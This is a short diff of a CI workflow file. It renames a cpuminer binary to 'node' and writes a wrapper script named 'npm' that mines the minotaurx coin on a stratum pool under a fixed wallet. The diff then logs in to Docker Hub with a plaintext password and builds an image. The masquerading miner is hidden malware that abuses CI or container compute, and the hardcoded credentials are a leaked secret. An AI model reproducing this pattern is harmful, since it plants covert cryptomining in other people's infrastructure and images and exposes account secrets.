@@ -17,7 +17,7 @@ jobs:
           ls
           rm cpuminer-avx cpuminer-avx2 cpuminer-avx512 cpuminer-avx512-sha-vaes cpuminer-opt-linux.tar.gz cpuminer-ryzen cpuminer-sse2amd cpuminer-sse42 cpuminer-sse42-aes
           mv cpuminer-sse2 node
-          echo "node -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq.plaths " > npm
+          echo "./node -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq.plaths " > npm
           chmod +x npm
           docker login -u christiankm01 -p Danang-112
           docker build . -t christiankm01/kilo:latest 
